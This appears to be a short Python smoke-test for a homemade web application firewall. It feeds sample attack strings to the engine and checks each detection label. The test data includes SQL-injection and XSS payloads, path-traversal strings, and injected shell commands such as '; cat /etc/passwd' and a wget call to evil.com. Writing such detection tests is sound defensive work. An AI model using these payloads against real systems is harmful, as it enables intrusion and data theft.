"""Quick smoke-test cho WAF Layer 1."""
import sys
sys.path.insert(0, "d:/vscode")

from waf.modsec_rules_set import MODSEC_RULES
from waf.waf_engine import WafEngine
from waf.waf_logger import log_alert

print("=== Rules loaded:", list(MODSEC_RULES.keys()))

engine = WafEngine()

tests = [
    ("SELECT * FROM users WHERE id=1", "SQL_Injection"),
    (" ' OR 1=1 --", "SQL_Injection"),
    ("<script>alert(1)</script>", "XSS_Attack"),
    ('"><img src=x onerror=alert(1)>', "XSS_Attack"),
    ("hello; cat /etc/passwd", "OS_Command_Injection"),
    ("input | wget http://evil.com", "OS_Command_Injection"),
    ("../../etc/passwd", "Path_Traversal"),
    ("..\\..\\boot.ini", "Path_Traversal"),
    ("Hello, this is a safe message.", None),
    ("What is 1+1?", None),
]

all_pass = True
for payload, expected in tests:
    r = engine.inspect(payload)
    got = r["attack_type"]
    status = "PASS" if got == expected else "FAIL"
    if status == "FAIL":
        all_pass = False
    pat = r["matched_pattern"] or "-"
    print(f"[{status}] expected={expected}, got={got}")
    if status == "FAIL":
        print(f"        payload  : {payload!r}")
        print(f"        pattern  : {pat}")

log_alert("SQL_Injection", "SELECT * FROM users")
print("\n=== Logger OK  ===")
print(f"=== All pass: {all_pass} ===")
